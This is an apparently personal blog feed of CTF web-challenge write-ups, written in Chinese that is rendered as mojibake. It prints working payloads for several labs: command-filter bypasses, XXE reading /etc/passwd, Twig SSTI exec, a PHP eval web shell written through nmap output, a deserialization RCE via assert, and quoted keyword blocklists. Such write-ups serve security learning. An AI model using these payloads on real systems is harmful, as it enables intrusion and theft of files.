æœ±é›€ç»„]phpweb</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231216142312108.png" alt="image-20231216142312108"></p><p>å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼ŒæŠ“ä¸ªåŒ…</p><p><img src="/../images/image-20231216142354527.png" alt="image-20231216142354527"></p><p>funcæ˜¯å‡½æ•°ï¼Œpæ˜¯å‡½æ•°çš„å‚æ•°</p><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=system&amp;p=whoami</span><br></pre></td></tr></table></figure><p>è¢«è¿‡æ»¤</p><p><img src="/../images/image-20231216142552487.png" alt="image-20231216142552487"></p><p>åŠ ä¸ªåæ–œæ ï¼Œå¯ä»¥æ‰§è¡Œ</p><p><img src="/../images/image-20231216142627523.png" alt="image-20231216142627523"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=\system&amp;p=cat $(find / -name flag*)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216142945673.png" alt="image-20231216142945673"></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231216143424625.png" alt="image-20231216143424625"></p><p>æ ¹æ®é¢˜ç›®çŒœæµ‹æ˜¯XXE</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216143833788.png" alt="image-20231216143833788"></p><p><img src="/../images/image-20231216143908742.png" alt="image-20231216143908742"></p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231216144112963.png" alt="image-20231216144112963"></p><p>flag</p><p><img src="/../images/image-20231216144446052.png" alt="image-20231216144446052"></p><p>idè¾“å…¥ä»€ä¹ˆå°±ä¼šæ˜¾ç¤ºä»€ä¹ˆ</p><p><img src="/../images/image-20231216144507177.png" alt="image-20231216144507177"></p><p>æŠ“åŒ…çœ‹ä¸€ä¸‹</p><p><img src="/../images/image-20231216144554296.png" alt="image-20231216144554296"></p><p>å°è¯•ä¸€ä¸‹æœ‰æ²¡æœ‰å¯èƒ½æ˜¯SSTI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216144813734.png" alt="image-20231216144813734"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216150315186.png" alt="image-20231216150315186"></p><h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231217101352330.png" alt="image-20231217101352330"></p><p>æ˜¯ä¸€ä¸ªåœ¨çº¿çš„nampç½‘ç«™</p><p>å°è¯•å†™å…¥ä¸€å¥è¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.php&#x27;</span><br></pre></td></tr></table></figure><p>è¢«è¿‡æ»¤</p><p><img src="/../images/image-20231217101549048.png" alt="image-20231217101549048"></p><p>phtml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯è¢«è¿‡æ»¤</p><p><img src="/../images/image-20231217101638457.png" alt="image-20231217101638457"></p><p>çŸ­æ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;? echo @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>æˆåŠŸ</p><p><img src="/../images/image-20231217101751551.png" alt="image-20231217101751551"></p><p><img src="/../images/image-20231217101924320.png" alt="image-20231217101924320"></p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231217104203705.png" alt="image-20231217104203705"></p><p>F12æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="/../images/image-20231217104243867.png" alt="image-20231217104243867"></p><p>è®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„é€ åºåˆ—åŒ–ï¼Œåˆ©ç”¨å‘½ä»¤æ‰§è¡Œå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">HelloPhp</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231217104538747.png" alt="image-20231217104538747"></p><h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231219204126482.png" alt="image-20231219204126482"></p><p>è§£ç </p><p>ä¸¤æ¬¡base64+hex</p><p><img src="/../images/image-20231219204354996.png" alt="image-20231219204354996"></p><p>å°è¯•å¯¹index.phpè¿›è¡Œç›¸åŒç¼–ç </p><p><img src="/../images/image-20231219204524717.png" alt="image-20231219204524717"></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure><p>è§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰æ­£åˆ™è¿‡æ»¤ï¼Œå¹¶ä¸”éœ€è¦å¼ºç¢°æ’</p><p>ç›´æ¥burp:</p><p><img src="/../images/image-20231219203949964.png" alt="image-20231219203949964"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NISACTF-2022-popchains&quot;&gt;&lt;a href=&quot;#NISACTF-2022-popchains&quot; class=&quot;headerlink&quot; title=&quot;[NISACTF 2022]popchains&quot;&gt;&lt;/a&gt;[NISACTF 2022]popch</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTFåˆ·é¢˜</title>
    <link href="http://example.com/2023/11/06/NSSCTF%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/11/06/NSSCTF%E5%88%B7%E9%A2%98/</id>
    <published>2023-11-06T14:11:38.000Z</published>
    <updated>2023-12-11T00:54:05.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h1><p><img src="/../images/image-20231104185237617.png" alt="avatar"></p><p>æ„é€ ä¸€ä¸ªæ•°ç»„ä½¿usernameæŒ‡å‘trueï¼ŒpasswordæŒ‡å‘true</p><p>åºåˆ—åŒ–è¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt;<span class="hljs-literal">true</span>;<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt;<span class="hljs-literal">true</span>;<br><br>)<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>);<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>&#123;<span class="hljs-number">5</span>d142734-b351-<span class="hljs-number">4369</span>-<span class="hljs-number">831</span>f-<span class="hljs-number">1</span>ad48e317ce6&#125;<br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-æ–°ç”Ÿèµ›-ez-rce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ez-rce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rce</h1><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">## æ”¾å¼ƒæŠŠï¼Œå°ä¼™å­ï¼Œä½ çœŸçš„ä¸ä¼šRCE,ä½•å¿…åœ¨æ­¤çº ç»“å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;çœ‹çœ‹ä½ è¾“å…¥çš„å‚æ•°ï¼ï¼ï¼ä¸å«æ ·å­ï¼ï¼&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å±…ç„¶éƒ½ä¸è¾“å…¥å‚æ•°ï¼Œå¯æ¶!!!!!!!!!&quot;</span>;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>printfè¾“å‡ºæ ¼å¼åŒ–å­—ç¬¦ä¸²</p><p>&#96;&#96;åå¼•å·å†…å®¹è¢«å½“ä½œå‘½ä»¤æ‰§è¡Œ</p><p>\åæ–œæ åˆ†å‰²</p><p>payload:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?code=printf(`l\s /`)<span class="hljs-comment">;</span><br>?code=printf(`ta\c /fffffffffflagafag`)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin&quot;&gt;&lt;a href=&quot;#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin&quot; class=&quot;headerlink&quot; title=&quot;[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin&quot;&gt;&lt;/a&gt;[HUBUCTF 2022</summary>
      
    
    
    
    
  </entry>
  
</feed>
